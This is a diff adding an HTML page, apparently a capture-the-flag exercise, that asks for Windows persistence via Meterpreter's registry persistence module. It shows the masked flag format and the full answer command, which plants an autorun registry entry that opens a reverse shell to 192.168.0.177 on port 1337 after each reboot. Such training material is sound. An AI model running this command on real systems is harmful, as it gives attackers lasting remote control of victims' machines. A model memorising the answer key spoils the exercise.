@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="../../css/Font.css">
+        <link rel="stylesheet" href="css/folderview.css">
+        <script src="js/folderview.js"></script>
+    </head>
+    <body>
+        <p>You want to achieve persistence using Meterpreter’s persistence module by creating an autorun registry file and getting a shell automatically every time the user restarts the PC</p>
+        &nbsp;
+        <p>Persistence options </p>
+        &nbsp;
+        <p>Minutes after restarting the system: 7 </p>
+        <p>Your Local port: 1337</p>
+        <p>Your local host IP: 192.168.0.177</p>
+        <p style="color:red;">Flag format is: xxx xxxxxxx/xxxxxxx/xxxxx/xxxxxxxx_xxxxxxxxxxx xxxxx_xxxx=xxx  xxxxx=xxxx xxxxx=xxx.xxx.x.xxx</p>
+
+        <h2><i>
+            run exploit/windows/local/registry_persistence SLEEP_TIME=420 LPORT=1337 LHOST=192.168.0.177 
+        </i></h2>
+    </body>
+</html>
